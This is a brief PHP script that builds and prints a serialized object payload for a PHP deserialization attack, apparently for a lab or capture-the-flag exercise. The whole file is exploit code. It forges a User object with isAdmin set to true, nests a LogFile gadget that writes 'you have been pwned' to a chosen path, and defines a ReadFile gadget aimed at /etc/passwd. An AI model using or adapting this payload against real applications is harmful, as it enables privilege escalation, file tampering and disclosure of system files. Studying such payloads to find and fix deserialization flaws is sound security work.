<?php

class LogFile {
    public function __construct() {
        $this->filename = '/Users/ironsoul/Desktop/huy.txt';
        $this->username = 'you have been pwned';
    }
}

class ReadFile {
    public function __construct() {
        $this->filename = '/etc/passwd';
    }
}

class User {
    public function __construct() {
        $this->username = new LogFile();
        $this->isAdmin = true;
    }
}

$obj = new User();
echo serialize($obj);

?>
